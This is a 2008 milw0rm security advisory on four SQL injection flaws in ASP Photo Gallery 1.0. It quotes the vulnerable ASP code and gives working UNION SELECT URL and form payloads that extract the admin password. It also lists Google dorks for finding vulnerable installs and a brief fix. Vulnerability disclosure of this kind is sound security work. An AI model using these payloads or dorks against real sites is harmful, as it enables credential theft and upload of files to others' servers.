@@ -1,0 +1,102 @@
+######################################################################
+#
+# ASP Photo Gallery 1.0 - Multiple SQL Injection Vulnerabilities
+#
+# Date			: 12-january-2008
+# Risk			: Medium
+# Vendor URL		: http://www.matteobinda.com/apg.php
+# Google Dork		: "download this free gallery at matteobinda.com"
+#			: allinurl: imgbig.asp?id=
+#
+# Found By		: Ruben Ventura Piña (Trew)
+# Contact Info		: http://trew.icenetx.net
+#			  trew.revolution@gmail.com
+#			  ICEnetX Team - http://icenetx.net
+#
+######################################################################
+#
+#  Greetings oh earthlings: 
+#	Ayzax, BRIO, Gaper (All ICEnetX Team)
+#	and to all people who likes H.I.M, lol.
+#
+#	"Maybe you can't break the system, but you can always hack it."
+#
+######################################################################
+#
+## Vulnerability ##
+#
+# "ASP Photo Gallery" is a free tool to create web galleries. It was
+# written in ASP and uses an Access Database to store data.
+# Input is not propperly santised, therefore the application has
+# multiple SQL injection vulnerabilities.
+#
+# ---
+# First bug:
+# The following code in the Imgbig.asp file is vulnerable:
+#	<% ...
+#	nomefoto = request("Id")
+#	...
+#	sql = "SELECT * FROM fotoinfo WHERE name='" & nomefoto & "'"
+#	objrs.Open sql, objConn ,3,3
+#	... %>
+#
+# Input passed to the "Id" parameter is not santised. This can be
+# exploited in the following manner to obtain the admin's password:
+#
+# http://[site]/Imgbig.asp?Id='union select user as name,1,pass as descrizione from stuff where '1'='1
+#
+# ---
+# Second bug:
+# The following code in the thumbricerca.asp file is vulnerable:
+#	<% ...
+#	ricerca = Request.QueryString("id")
+#	...
+#	sql = "SELECT * from fotoinfo where descrizione like '%" & ricerca & "%'  order by name desc"
+#	objrs.Open sql, objConn ,3,3
+#	... %>
+#
+# Input passed to the "id" parameter is not santised. This can be
+# exploited in the following manner to obtain the admin's password:
+#
+# /thumbricerca.asp?id=-1'union select user as name,1,pass as descrizione from stuff where 1 like '%
+#
+# ---
+# Third bug:
+# The following code in the thumbricerca.asp file is vulnerable:
+#	<% ...
+#	ricerca = request.form("ricerca")
+#	...
+#	sql = "SELECT * from fotoinfo where descrizione like '%" & ricerca & "%'  order by name desc"
+#	objrs.Open sql, objConn ,3,3
+#	... %>
+#
+# Input passed to the "ricerca" parameter is not santised. This can be
+# exploited by inserting the following code into the search textfield
+# located in the thumbricerca.asp file:
+#	-1'union select user as name,1,pass as descrizione from stuff where 1 like '%
+# --
+# Fourth bug:
+# The following code in the thumb.asp file is vulnerable:
+#	<% ...
+#	intCodice = request("id")
+#	...
+#	sql = "SELECT * from fotoinfo where category ='" & intcodice & "' order by name desc"
+#	objrs.Open sql, objConn ,3,3
+#	..%>
+#
+# Input passed to the "id" parameter is not santised. This can be exploited
+# in the following manner to obtain the admin's password:
+#
+#  /thumb.asp?id=' union select user as name,1,pass as descrizione from stuff where '1'='1
+#
+#
+# After an attacker has logged in into the admin panel (/admin/admin.asp), he'll have the
+# possibility to upload files to the server.
+#
+#
+## How to fix ##
+#
+# Santise all input which is then used in SQL queries.
+#
+
+# milw0rm.com [2008-01-12]
